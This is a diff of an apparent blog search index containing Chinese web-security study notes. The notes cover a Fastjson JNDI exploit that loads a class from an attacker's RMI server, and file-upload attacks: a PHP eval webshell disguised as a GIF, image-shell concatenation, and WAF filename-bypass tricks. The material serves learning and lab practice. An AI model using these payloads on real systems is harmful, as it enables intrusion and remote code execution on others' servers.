@@ -424,11 +424,14 @@
 <p><img src="https://i.loli.net/2021/09/16/xh3gPHeXZBwDjEA.png" alt="image-20210916190611966"></p>
 <p>编译完成会出现<code>BUILD SUCCESS</code>，target目录下会生成marshalsec-0.0.3-SNAPSHOT-all.jar文件</p>
 <p><img src="https://i.loli.net/2021/09/16/6OFLAdjEXPINl9v.png" alt="image-20210916201555690"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http:&#x2F;&#x2F;搭建dnslog.class类http服务的服务器:1111&#x2F;#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure>
-<h4 id="burp构造请求包"><a href="#burp构造请求包" class="headerlink" title="burp构造请求包"></a>burp构造请求包</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 靶机Ip:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 160</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;b&quot;:&#123;</span><br><span class="line">            &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">            &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;搭建dnslog.class类的服务器ip:1111&#x2F;xxx.ceye.io&quot;,</span><br><span class="line">            &quot;autoCommit&quot;:true</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http:&#x2F;&#x2F;搭建dnslog.class类http服务的服务器:1111&#x2F;#dnslog&quot; 9999</span><br></pre></td></tr></table></figure>
+<h4 id="burp构造请求包"><a href="#burp构造请求包" class="headerlink" title="burp构造请求包"></a>burp构造请求包</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 靶机Ip:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 160</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;b&quot;:&#123;</span><br><span class="line">            &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">            &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;搭建dnslog.class类的服务器ip:1111&#x2F;dnslog&quot;,</span><br><span class="line">            &quot;autoCommit&quot;:true</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 <p>后来又在另一台vps上搭建了jdk+maven环境进行测试</p>
 <p><img src="https://i.loli.net/2021/09/17/kMCgWVD1Zxmj6Ki.png" alt="image-20210917210129994"></p>
-<p>但是要访问的文件不存在，请求包中构造错了，<code>xxx/ceye.io</code>改为<code>dnslog</code></p>
+<p>但是要访问的文件不存在，代码没整明白，请求包中构造错了</p>
+<p><u>xxx/ceye.io改为dnslog</u></p>
+<p><img src="https://i.loli.net/2021/09/17/FEkLDANtGj4svyX.png" alt="image-20210917212757304"></p>
+<p>过了十分钟又有请求了，但还是不行</p>
 <p>然后就一直访问不上，怀疑是ceye.io存在问题，ceye.io平台也没有数据</p>
 <blockquote>
 <p>目前没找到好用的dnslog平台，可以尝试自己搭建一个来使用</p>
@@ -1047,6 +1050,182 @@
       </tags>
   </entry>
   <entry>
+    <title>常见web漏洞学习之文件上传知识点总结</title>
+    <url>/2021/05/26/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h2 id="常见web漏洞学习之文件上传"><a href="#常见web漏洞学习之文件上传" class="headerlink" title="常见web漏洞学习之文件上传"></a>常见web漏洞学习之文件上传</h2><blockquote>
+<p>.htacess的Apache解析漏洞</p>
+<p>配合文件包含，图片马</p>
+<p>条件竞争</p>
+</blockquote>
+<h3 id="客户端验证"><a href="#客户端验证" class="headerlink" title="客户端验证"></a>客户端验证</h3><p>js校验后缀名</p>
+<p>绕过：先把木马改为jpg或其他形式，burp抓包后修改为php</p>
+<h3 id="服务端验证"><a href="#服务端验证" class="headerlink" title="服务端验证"></a>服务端验证</h3><ol>
+<li>MIME</li>
+</ol>
+<p>绕过：burp修改文件头content-type字段为image/gif</p>
+<ol start="2">
+<li>文件内容头</li>
+</ol>
+<p>在<img src alt="img">马之前加上一些图片信息，如</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a&lt;?php @eval($_POST[&#39;caidao&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<ol>
+<li>文件扩展名校验（白名单，黑名单）</li>
+<li>文件内容检测（检测内容是否合法或是是否有恶意代码）</li>
+</ol>
+<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><ol>
+<li><strong>大小写、双写</strong>绕过pphphp</li>
+<li>文件名后加上个**.<strong>或是</strong>空格**（burp中修改）</li>
+</ol>
+<ul>
+<li>🔲尝试黑名单可能没有的类型，如<strong>asa、cer、.htaccess</strong></li>
+</ul>
+<blockquote>
+<p>.htaccess是Apache的</p>
+</blockquote>
+<ol start="4">
+<li><p>修改后缀类型，php修改为<strong>php3、php5</strong>（php高版本会向低版本兼容）</p>
+</li>
+<li><p>针对Windows系统，上传不符合Windows命名规则的文件名，可以尝试**::$DATA<strong>进行绕过或是</strong>:1.jpg**</p>
+</li>
+</ol>
+<blockquote>
+<p>windows下文件名+::$DATA，会把它当做数据流来处理，不会检验文件的后缀名，并且保留::$DATA之前的的文件名及后缀</p>
+<p>简单来说，数据流$DATA是Windows下NTFS文件系统的一个特性，即NTFS文件系统的存储数据流的一个属性DATA时，就是请求 a.asp 本身的数据，如果a.asp 还包含了其他的数据流，比如 a.asp:lake2.asp，请求 a.asp:lake2.asp::$DATA，则是请求a.asp中的流数据lake2.asp的流数据内容。</p>
+</blockquote>
+<ol start="6">
+<li><strong>%00</strong>截断，解析的时候会自动忽略%00后面的内容</li>
+</ol>
+<blockquote>
+<ul>
+<li>常用在服务端把文件路径和文件名加在一起进行判断后缀</li>
+<li>截断条件：</li>
+</ul>
+<p><em>php &lt; 5.3.4</em></p>
+<p>php.ini文件<em>magic_quotes_gpc</em>为<em>off</em>（这个函数的作用是转义字符，在php&gt;5.4.0中已经移除了） </p>
+<ul>
+<li>当参数是以post方式传入时，需要二进制修改 <code>2e</code>改为<code>00</code></li>
+</ul>
+</blockquote>
+<ol start="7">
+<li>🔲配合<strong>文件包含</strong>使用</li>
+</ol>
+<blockquote>
+<p>上传<strong>图片马</strong></p>
+<p>拼接图片马：copy xxx.jpg /b + shell.php /a shell.jpg （b是binary二进制的意思，/b就是以二进制的格式）</p>
+<p>进行文件包含</p>
+</blockquote>
+<ol start="8">
+<li>🔲<strong>条件竞争</strong></li>
+</ol>
+<blockquote>
+<p>简单来说就是利用了并发处理请求不当或是相关操作逻辑顺序设计不合理时，会导致条件竞争的发生</p>
+<p>具体实例可见upload-labs pass17、18</p>
+<p>pass17源码 – 利用方式：在文件删除之前访问文件</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</span><br><span class="line">    $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];  &#x2F;&#x2F;$_FILES数组，$file_name就是upload_file的文件名</span><br><span class="line">    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];  &#x2F;&#x2F;$temp_file就是upload_file的临时文件名</span><br><span class="line">    $file_ext &#x3D; substr($file_name,strrpos($file_name,&quot;.&quot;)+1);  &#x2F;&#x2F;返回$file_name的文件后缀</span><br><span class="line">    $upload_file &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line"></span><br><span class="line">    if(move_uploaded_file($temp_file, $upload_file))&#123;  &#x2F;&#x2F;对$temp_file进行合法检验</span><br><span class="line">        if(in_array($file_ext,$ext_arr))&#123;  &#x2F;&#x2F;判断$file_ext是否在$ext_arr中，即判断文件后缀是否合法</span><br><span class="line">             $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload &#x3D; true;</span><br><span class="line">        &#125;else&#123;  &#x2F;&#x2F;如果后缀不合法</span><br><span class="line">            $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg &#x3D; &#39;上传出错！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+<h3 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h3><ul>
+<li>trim(string,charlist) ——<strong>移除</strong>字符串两侧的空白或其他预定义的字符charlist</li>
+<li>strrchr(string,char) ——在string中<strong>查找</strong>char最后出现的位置，并返回（<strong>截取</strong>）包括char在内到字符串末尾的所有字符</li>
+<li>str_ireplace(find,replace,string) ——在string中找到find，然后进行<strong>替换</strong>replace</li>
+<li>substr(string,start,length可选) ——在string中从start处开始，<strong>返回</strong>length长度的<strong>字符串</strong></li>
+<li>strrpos(string,find,start可选) ——在string中从start开始，<strong>返回</strong>最后一次出现的<strong>位置</strong></li>
+<li>move_uploaded_file(string $filename,string $destination) ——检测确保上传的文件filename是合法的（即通过post方式上传），如果合法就将其<strong>移动</strong>为由destination指定的文件</li>
+<li>in_array(data,array) —— 检查数组array中是否存在某个值data</li>
+</ul>
+<h2 id="bypass之waf"><a href="#bypass之waf" class="headerlink" title="bypass之waf"></a>bypass之waf</h2><p>总体的思路就是让waf无法获取到文件名或是其他方式无法判断上传的木马（php、jsp、asp、aspx等）</p>
+<h3 id="waf检查的东西"><a href="#waf检查的东西" class="headerlink" title="waf检查的东西"></a>waf检查的东西</h3><p>根据前面的学习，猜测waf会检查</p>
+<ul>
+<li>MIME类型</li>
+<li>文件扩展名</li>
+<li>文件内容</li>
+</ul>
+<p>除此之外还会检查</p>
+<ul>
+<li>请求的url</li>
+<li>Boundary边界</li>
+</ul>
+<h3 id="常见扩展名黑名单："><a href="#常见扩展名黑名单：" class="headerlink" title="常见扩展名黑名单："></a>常见扩展名黑名单：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">asp|asa|cer|cdx|aspx|ashx|ascx|asax</span><br><span class="line"></span><br><span class="line">php|php2|php3|php4|php5|asis|htaccess</span><br><span class="line"></span><br><span class="line">htm|html|shtml|pwml|phtml|phtm|js|jsp</span><br><span class="line"></span><br><span class="line">vbs|asis|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini</span><br></pre></td></tr></table></figure>
+
+
+<p>这里并没有进行复现，只是可能进行绕过的一些思路</p>
+<h3 id="增加Content-Disposition字段长度"><a href="#增加Content-Disposition字段长度" class="headerlink" title="增加Content-Disposition字段长度"></a>增加Content-Disposition字段长度</h3><blockquote>
+<p>在常规的 HTTP 应答中，Content-Disposition 响应头指示回复的内容该以何种形式展示，是以内联的形式（即网页或者页面的一部分），还是以附件的形式下载并保存到本地。</p>
+<p>在  multipart/form-data 类型的应答消息体中，Content-Disposition 消息头可以被用在 multipart  消息体的子部分中，用来给出其对应字段的相关信息。各个子部分由在Content-Type 中定义的分隔符分隔。用在消息体自身则无实际意义。</p>
+<p>Content-Disposition 消息头最初是在 MIME 标准中定义的，HTTP 表单及 POST 请求只用到了其所有参数的一个子集。只有 form-data 以及可选的 name 和 filename 三个参数可以应用在HTTP场景中。</p>
+</blockquote>
+<h3 id="对文件名进行修改"><a href="#对文件名进行修改" class="headerlink" title="对文件名进行修改"></a>对文件名进行修改</h3><ol>
+<li>去除filename=”shell.php”中的双引号或是修改为单引号，扰乱匹配</li>
+<li>因为文件在上传时接收的是最后一个文件，那么尝试在这之前加一些干扰的filename参数</li>
+</ol>
+<blockquote>
+<p>Content-Disposition: form-data; name=”file”; filename=1.jpg;  filename=”shell.php”</p>
+</blockquote>
+<ol>
+<li>当是对所有的filename进行检测时，尝试将前面的filename去掉</li>
+</ol>
+<blockquote>
+<p>Content-Disposition: form-data; name=”file”; filename= ;  filename=”shell.php”</p>
+</blockquote>
+<h3 id="在文件名中间加符号扰乱匹配，如"><a href="#在文件名中间加符号扰乱匹配，如" class="headerlink" title="在文件名中间加符号扰乱匹配，如"></a>在文件名中间加符号扰乱匹配，如</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;</span><br><span class="line">&#39;</span><br><span class="line"> (空格)</span><br></pre></td></tr></table></figure>
+<h3 id="对filename动手脚"><a href="#对filename动手脚" class="headerlink" title="对filename动手脚"></a>对filename动手脚</h3><blockquote>
+<p>让waf对filename这个字符串匹配不到，但是服务器又可以接收，加入换行这类的干扰</p>
+</blockquote>
+<h4 id="可能的绕过"><a href="#可能的绕过" class="headerlink" title="可能的绕过"></a>可能的绕过</h4><ol>
+<li>对文件名中的每个字符进行换行</li>
+<li>切断filename=和之后的值（换行）</li>
+<li>文件名换行，就是在HEX中加入0a</li>
+</ol>
+<h3 id="修改匹配字段"><a href="#修改匹配字段" class="headerlink" title="修改匹配字段"></a>修改匹配字段</h3><blockquote>
+<p>filename参数是在post包中的 Content-Disposition 字段，那么waf也是先匹配到这个http头在对内容进行检测，我们可以尝试对这个头的特征进行修改</p>
+<p>我们尝试去掉这个form-data   (form-data;的意思是内容描述，form-data的意思是来自表单的数据，但是即使不写form-data，apache也接受。)</p>
+</blockquote>
+<ol>
+<li>去掉form-data</li>
+<li>对Content-Disposition 字段进行参数污染、Content-Disposition大小写混淆</li>
+</ol>
+<blockquote>
+<p>Content-Disposition 字段参数污染</p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1622537709838-cca051af-9c06-47ed-afb8-bc4fa3a77a03.png" alt="image.png"></p>
+<ol>
+<li>添加额外的Content-Type字段</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1622537878758-5e4a903f-245e-4d4d-b8c0-483ac68a0bde.png" alt="image.png"></p>
+<ol>
+<li>添加额外的filename进行参数污染</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1622537967923-04649433-fbab-4386-8491-0b0b08e35ed6.png" alt="image.png"></p>
+<ol>
+<li>添加额外的Content-Length头</li>
+</ol>
+<h3 id="多个等号"><a href="#多个等号" class="headerlink" title="多个等号"></a>多个等号</h3><blockquote>
+<p>就是将filename=处添加多个等号</p>
+</blockquote>
+<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><blockquote>
+<p>产生的原因是0x00为十六进制表示法，ASCII码里就为0，有些函数在处理时会将其当做结束符；当url中出现%00会认为读取已经结束</p>
+</blockquote>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p>[文件上传Bypass安全狗 ](</p>
+<h3 id="参考的一些博客"><a href="#参考的一些博客" class="headerlink" title="参考的一些博客"></a>参考的一些博客</h3><p><a href="https://blog.csdn.net/qq_39670065/article/details/107366077?spm=1001.2014.3001.5501">upload-labs通关记录</a></p>
+<p><a href="https://xz.aliyun.com/t/4029#toc-15">Upload-labs 20关通关笔记</a></p>
+<p><a href="https://wiki.wgpsec.org/knowledge/web/fileuploads.html">狼组公开文库</a></p>
+<p><a href="https://www.cnblogs.com/luolaobiao/p/9917878.html">常见的文件上传绕过和文件解析漏洞</a></p>
+]]></content>
+      <categories>
+        <category>文件上传</category>
+      </categories>
+      <tags>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>常见web漏洞学习之CSRF</title>
     <url>/2021/07/14/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BCSRF/</url>
     <content><![CDATA[<h1 id="csrf学习"><a href="#csrf学习" class="headerlink" title="csrf学习"></a>csrf学习</h1><p>跨站请求伪造</p>
@@ -1241,182 +1420,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>常见web漏洞学习之文件上传知识点总结</title>
-    <url>/2021/05/26/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<h2 id="常见web漏洞学习之文件上传"><a href="#常见web漏洞学习之文件上传" class="headerlink" title="常见web漏洞学习之文件上传"></a>常见web漏洞学习之文件上传</h2><blockquote>
-<p>.htacess的Apache解析漏洞</p>
-<p>配合文件包含，图片马</p>
-<p>条件竞争</p>
-</blockquote>
-<h3 id="客户端验证"><a href="#客户端验证" class="headerlink" title="客户端验证"></a>客户端验证</h3><p>js校验后缀名</p>
-<p>绕过：先把木马改为jpg或其他形式，burp抓包后修改为php</p>
-<h3 id="服务端验证"><a href="#服务端验证" class="headerlink" title="服务端验证"></a>服务端验证</h3><ol>
-<li>MIME</li>
-</ol>
-<p>绕过：burp修改文件头content-type字段为image/gif</p>
-<ol start="2">
-<li>文件内容头</li>
-</ol>
-<p>在<img src alt="img">马之前加上一些图片信息，如</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a&lt;?php @eval($_POST[&#39;caidao&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
-
-
-<ol>
-<li>文件扩展名校验（白名单，黑名单）</li>
-<li>文件内容检测（检测内容是否合法或是是否有恶意代码）</li>
-</ol>
-<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><ol>
-<li><strong>大小写、双写</strong>绕过pphphp</li>
-<li>文件名后加上个**.<strong>或是</strong>空格**（burp中修改）</li>
-</ol>
-<ul>
-<li>🔲尝试黑名单可能没有的类型，如<strong>asa、cer、.htaccess</strong></li>
-</ul>
-<blockquote>
-<p>.htaccess是Apache的</p>
-</blockquote>
-<ol start="4">
-<li><p>修改后缀类型，php修改为<strong>php3、php5</strong>（php高版本会向低版本兼容）</p>
-</li>
-<li><p>针对Windows系统，上传不符合Windows命名规则的文件名，可以尝试**::$DATA<strong>进行绕过或是</strong>:1.jpg**</p>
-</li>
-</ol>
-<blockquote>
-<p>windows下文件名+::$DATA，会把它当做数据流来处理，不会检验文件的后缀名，并且保留::$DATA之前的的文件名及后缀</p>
-<p>简单来说，数据流$DATA是Windows下NTFS文件系统的一个特性，即NTFS文件系统的存储数据流的一个属性DATA时，就是请求 a.asp 本身的数据，如果a.asp 还包含了其他的数据流，比如 a.asp:lake2.asp，请求 a.asp:lake2.asp::$DATA，则是请求a.asp中的流数据lake2.asp的流数据内容。</p>
-</blockquote>
-<ol start="6">
-<li><strong>%00</strong>截断，解析的时候会自动忽略%00后面的内容</li>
-</ol>
-<blockquote>
-<ul>
-<li>常用在服务端把文件路径和文件名加在一起进行判断后缀</li>
-<li>截断条件：</li>
-</ul>
-<p><em>php &lt; 5.3.4</em></p>
-<p>php.ini文件<em>magic_quotes_gpc</em>为<em>off</em>（这个函数的作用是转义字符，在php&gt;5.4.0中已经移除了） </p>
-<ul>
-<li>当参数是以post方式传入时，需要二进制修改 <code>2e</code>改为<code>00</code></li>
-</ul>
-</blockquote>
-<ol start="7">
-<li>🔲配合<strong>文件包含</strong>使用</li>
-</ol>
-<blockquote>
-<p>上传<strong>图片马</strong></p>
-<p>拼接图片马：copy xxx.jpg /b + shell.php /a shell.jpg （b是binary二进制的意思，/b就是以二进制的格式）</p>
-<p>进行文件包含</p>
-</blockquote>
-<ol start="8">
-<li>🔲<strong>条件竞争</strong></li>
-</ol>
-<blockquote>
-<p>简单来说就是利用了并发处理请求不当或是相关操作逻辑顺序设计不合理时，会导致条件竞争的发生</p>
-<p>具体实例可见upload-labs pass17、18</p>
-<p>pass17源码 – 利用方式：在文件删除之前访问文件</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</span><br><span class="line">    $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];  &#x2F;&#x2F;$_FILES数组，$file_name就是upload_file的文件名</span><br><span class="line">    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];  &#x2F;&#x2F;$temp_file就是upload_file的临时文件名</span><br><span class="line">    $file_ext &#x3D; substr($file_name,strrpos($file_name,&quot;.&quot;)+1);  &#x2F;&#x2F;返回$file_name的文件后缀</span><br><span class="line">    $upload_file &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line"></span><br><span class="line">    if(move_uploaded_file($temp_file, $upload_file))&#123;  &#x2F;&#x2F;对$temp_file进行合法检验</span><br><span class="line">        if(in_array($file_ext,$ext_arr))&#123;  &#x2F;&#x2F;判断$file_ext是否在$ext_arr中，即判断文件后缀是否合法</span><br><span class="line">             $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload &#x3D; true;</span><br><span class="line">        &#125;else&#123;  &#x2F;&#x2F;如果后缀不合法</span><br><span class="line">            $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg &#x3D; &#39;上传出错！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-<h3 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h3><ul>
-<li>trim(string,charlist) ——<strong>移除</strong>字符串两侧的空白或其他预定义的字符charlist</li>
-<li>strrchr(string,char) ——在string中<strong>查找</strong>char最后出现的位置，并返回（<strong>截取</strong>）包括char在内到字符串末尾的所有字符</li>
-<li>str_ireplace(find,replace,string) ——在string中找到find，然后进行<strong>替换</strong>replace</li>
-<li>substr(string,start,length可选) ——在string中从start处开始，<strong>返回</strong>length长度的<strong>字符串</strong></li>
-<li>strrpos(string,find,start可选) ——在string中从start开始，<strong>返回</strong>最后一次出现的<strong>位置</strong></li>
-<li>move_uploaded_file(string $filename,string $destination) ——检测确保上传的文件filename是合法的（即通过post方式上传），如果合法就将其<strong>移动</strong>为由destination指定的文件</li>
-<li>in_array(data,array) —— 检查数组array中是否存在某个值data</li>
-</ul>
-<h2 id="bypass之waf"><a href="#bypass之waf" class="headerlink" title="bypass之waf"></a>bypass之waf</h2><p>总体的思路就是让waf无法获取到文件名或是其他方式无法判断上传的木马（php、jsp、asp、aspx等）</p>
-<h3 id="waf检查的东西"><a href="#waf检查的东西" class="headerlink" title="waf检查的东西"></a>waf检查的东西</h3><p>根据前面的学习，猜测waf会检查</p>
-<ul>
-<li>MIME类型</li>
-<li>文件扩展名</li>
-<li>文件内容</li>
-</ul>
-<p>除此之外还会检查</p>
-<ul>
-<li>请求的url</li>
-<li>Boundary边界</li>
-</ul>
-<h3 id="常见扩展名黑名单："><a href="#常见扩展名黑名单：" class="headerlink" title="常见扩展名黑名单："></a>常见扩展名黑名单：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">asp|asa|cer|cdx|aspx|ashx|ascx|asax</span><br><span class="line"></span><br><span class="line">php|php2|php3|php4|php5|asis|htaccess</span><br><span class="line"></span><br><span class="line">htm|html|shtml|pwml|phtml|phtm|js|jsp</span><br><span class="line"></span><br><span class="line">vbs|asis|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini</span><br></pre></td></tr></table></figure>
-
-
-<p>这里并没有进行复现，只是可能进行绕过的一些思路</p>
-<h3 id="增加Content-Disposition字段长度"><a href="#增加Content-Disposition字段长度" class="headerlink" title="增加Content-Disposition字段长度"></a>增加Content-Disposition字段长度</h3><blockquote>
-<p>在常规的 HTTP 应答中，Content-Disposition 响应头指示回复的内容该以何种形式展示，是以内联的形式（即网页或者页面的一部分），还是以附件的形式下载并保存到本地。</p>
-<p>在  multipart/form-data 类型的应答消息体中，Content-Disposition 消息头可以被用在 multipart  消息体的子部分中，用来给出其对应字段的相关信息。各个子部分由在Content-Type 中定义的分隔符分隔。用在消息体自身则无实际意义。</p>
-<p>Content-Disposition 消息头最初是在 MIME 标准中定义的，HTTP 表单及 POST 请求只用到了其所有参数的一个子集。只有 form-data 以及可选的 name 和 filename 三个参数可以应用在HTTP场景中。</p>
-</blockquote>
-<h3 id="对文件名进行修改"><a href="#对文件名进行修改" class="headerlink" title="对文件名进行修改"></a>对文件名进行修改</h3><ol>
-<li>去除filename=”shell.php”中的双引号或是修改为单引号，扰乱匹配</li>
-<li>因为文件在上传时接收的是最后一个文件，那么尝试在这之前加一些干扰的filename参数</li>
-</ol>
-<blockquote>
-<p>Content-Disposition: form-data; name=”file”; filename=1.jpg;  filename=”shell.php”</p>
-</blockquote>
-<ol>
-<li>当是对所有的filename进行检测时，尝试将前面的filename去掉</li>
-</ol>
-<blockquote>
-<p>Content-Disposition: form-data; name=”file”; filename= ;  filename=”shell.php”</p>
-</blockquote>
-<h3 id="在文件名中间加符号扰乱匹配，如"><a href="#在文件名中间加符号扰乱匹配，如" class="headerlink" title="在文件名中间加符号扰乱匹配，如"></a>在文件名中间加符号扰乱匹配，如</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;</span><br><span class="line">&#39;</span><br><span class="line"> (空格)</span><br></pre></td></tr></table></figure>
-<h3 id="对filename动手脚"><a href="#对filename动手脚" class="headerlink" title="对filename动手脚"></a>对filename动手脚</h3><blockquote>
-<p>让waf对filename这个字符串匹配不到，但是服务器又可以接收，加入换行这类的干扰</p>
-</blockquote>
-<h4 id="可能的绕过"><a href="#可能的绕过" class="headerlink" title="可能的绕过"></a>可能的绕过</h4><ol>
-<li>对文件名中的每个字符进行换行</li>
-<li>切断filename=和之后的值（换行）</li>
-<li>文件名换行，就是在HEX中加入0a</li>
-</ol>
-<h3 id="修改匹配字段"><a href="#修改匹配字段" class="headerlink" title="修改匹配字段"></a>修改匹配字段</h3><blockquote>
-<p>filename参数是在post包中的 Content-Disposition 字段，那么waf也是先匹配到这个http头在对内容进行检测，我们可以尝试对这个头的特征进行修改</p>
-<p>我们尝试去掉这个form-data   (form-data;的意思是内容描述，form-data的意思是来自表单的数据，但是即使不写form-data，apache也接受。)</p>
-</blockquote>
-<ol>
-<li>去掉form-data</li>
-<li>对Content-Disposition 字段进行参数污染、Content-Disposition大小写混淆</li>
-</ol>
-<blockquote>
-<p>Content-Disposition 字段参数污染</p>
-</blockquote>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1622537709838-cca051af-9c06-47ed-afb8-bc4fa3a77a03.png" alt="image.png"></p>
-<ol>
-<li>添加额外的Content-Type字段</li>
-</ol>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1622537878758-5e4a903f-245e-4d4d-b8c0-483ac68a0bde.png" alt="image.png"></p>
-<ol>
-<li>添加额外的filename进行参数污染</li>
-</ol>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1622537967923-04649433-fbab-4386-8491-0b0b08e35ed6.png" alt="image.png"></p>
-<ol>
-<li>添加额外的Content-Length头</li>
-</ol>
-<h3 id="多个等号"><a href="#多个等号" class="headerlink" title="多个等号"></a>多个等号</h3><blockquote>
-<p>就是将filename=处添加多个等号</p>
-</blockquote>
-<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><blockquote>
-<p>产生的原因是0x00为十六进制表示法，ASCII码里就为0，有些函数在处理时会将其当做结束符；当url中出现%00会认为读取已经结束</p>
-</blockquote>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p>[文件上传Bypass安全狗 ](</p>
